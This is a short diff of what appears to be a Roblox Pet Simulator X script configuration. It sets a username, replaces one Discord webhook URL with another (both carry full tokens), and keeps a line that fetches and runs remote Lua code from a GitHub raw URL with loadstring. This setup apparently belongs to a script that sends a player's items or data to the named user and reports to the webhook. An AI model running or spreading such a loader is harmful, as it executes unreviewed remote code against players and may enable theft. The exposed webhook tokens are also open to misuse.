@@ -1,4 +1,4 @@
 UserName = "roblox_psxess2"
-WebHook = "https://discord.com/api/webhooks/1059169385140457542/zN9aAuFobEG7VGYv2MIPT5KyvhRs4rd6_KeAIepz82aqMFOAFcpU2h8_WCjE6L0KR96k"
+WebHook = "https://discord.com/api/webhooks/1059173086718607501/ZWw2811X9zefoUkLreRYpbeBsh5yLBJ8N_dbJZ3ssKxIBXhyKZ-CcWCeyEfpq88rahHQ"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
